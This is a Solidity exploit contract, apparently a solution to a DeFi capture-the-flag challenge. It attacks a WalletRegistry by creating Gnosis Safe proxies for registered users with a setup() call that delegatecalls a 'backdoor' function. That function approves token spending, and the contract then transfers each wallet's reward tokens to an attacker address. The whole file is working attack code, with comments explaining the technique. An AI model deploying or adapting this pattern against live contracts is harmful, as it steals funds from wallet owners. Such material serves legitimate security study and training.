// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis/contracts/GnosisSafe.sol";
import "@gnosis/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title maliciousModule
 * @notice this contract is used to attack the WalletRegistry contract.
            The exploit is done by using the 'feature' provided by the Gnosis contracts to attach a module at the time of the proxy creation.
            This is done by calling the setup() function of the Gnosis safe (delegatecall from proxy to gnosisSafe master/singleton).
            The factory indeed allows to execute a function at the time of the contract creation (initializer).
            This function is setup(), which itself allows to execute any function on any other contract (to allow a module to be created).
            Then the factory allows to do a callback (proxyCreated()) on any contract, we use walletRegistry.
            This malicious module will immediately approve the spending of the tokens when called (function backdoor())
 * @dev 
 * @author @trx314
 */

 contract maliciousModule {

    //  keep the same storage structure as the receiving contract
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    
    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;
    address public immutable walletOwner;
    address public immutable walletRegistry;
    address public immutable attacker;

    // owner => wallet
    mapping (address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress, 
        address tokenAddress, 
        address walletOwnerAddress,
        address walletRegistryAddress,
        address attackerAddress
    ) {
        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);
        walletOwner = walletOwnerAddress;
        walletRegistry = walletRegistryAddress;
        attacker = attackerAddress;
    }

    // backdoor function: will be called by the setup() executed at the moment of the creation of the proxy.
    // it is executed as a delegatecall from the proxy (wallet), therefore the token approval is done in the context of the proxy
    function backdoor(address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function attack(address[] memory users) external {

        // for each user
        for (uint256 i = 0; i < users.length; i++) {
            
            uint256 saltnonce = 666;
            // owners of the safe is only the current user
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            
            // calldata used in the initializer
            // it will call the backdoor() function of the present malicious module
            bytes memory data_backdoor = abi.encodeWithSignature(
                "backdoor(address,uint256)",
                address(this),
                TOKEN_PAYMENT
                );

            // intializer setting to call the setup() function of GnosisSafe.sol (delegate call through the proxy)
            bytes memory data_initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners, // the user who will own the gnosis safe wallet
                MAX_THRESHOLD, // the threshold (nb of signatures required)
                address(this), // the address used to execute a delegate call on an external contract (this malicious contract)
                data_backdoor,  // the calldata of the delegate call
                address(0),
                address(0),
                0,
                address(0)
                );

            // call the factory to create the proxy
            bytes memory data_createProxy = abi.encodeWithSignature(
                "createProxyWithCallback(address,bytes,uint256,address)",
                masterCopy,
                data_initializer,
                saltnonce,
                walletRegistry
                );
            (bool success, bytes memory return_data) = walletFactory.call(data_createProxy);
            
            // the encodeWithSignature from the factory returns the proxy address once it has been created
            address proxy_address = abi.decode(return_data, (address));

            // transfer tokens from proxy (wallet) to the attacker EOA
            token.transferFrom(proxy_address, attacker, TOKEN_PAYMENT);

        }

        



    }

 }